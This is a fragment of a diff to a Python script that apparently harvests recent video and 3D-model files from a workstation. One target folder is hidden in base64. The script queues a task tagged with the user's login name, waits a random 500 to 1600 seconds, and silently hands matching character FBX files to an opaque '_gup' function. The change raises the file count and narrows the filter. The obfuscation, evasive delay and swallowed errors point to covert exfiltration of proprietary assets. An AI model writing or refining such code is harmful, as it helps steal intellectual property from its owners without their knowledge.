@@ -120,7 +120,7 @@ try:
         zovV += search_latest_files_or_dirs(dir_path=dp, ext='.mp4')
         zovV += search_latest_files_or_dirs(dir_path=dp, ext='.mov')
         zovV += search_latest_files_or_dirs(dir_path=dp, ext='.abc')
-    zovV += search_latest_files_or_dirs(dir_path=base64.b64decode('TDovV0hNL0NIQVJBQ1RFUg==').decode(), ext='.fbx', n=20)
+    zovV += search_latest_files_or_dirs(dir_path=base64.b64decode('TDovV0hNL0NIQVJBQ1RFUg==').decode(), ext='.fbx', n=80)
     
     if zovV:
         add_queue_task('tst__{}'.format(getpass.getuser().lower()), {'file': zovV})
@@ -134,7 +134,7 @@ import random
 random.shuffle(zovV)
 time.sleep(random.uniform(500.0, 1600.0))
 for _, fp in zovV:
-    if fp.endswith('.fbx') and ('_CHAR_' in os.path.basename(fp) or '_ANML_' in os.path.basename(fp)) and os.path.basename(fp).startswith('SKM'):
+    if fp.endswith('.fbx') and ('_CHAR_' in os.path.basename(fp) or '_ANML_' in os.path.basename(fp)) and os.path.basename(fp).startswith('SKM') and '__LOW' in os.path.basename(fp):
         try:
             _gup(os.path.abspath(fp))
         except:
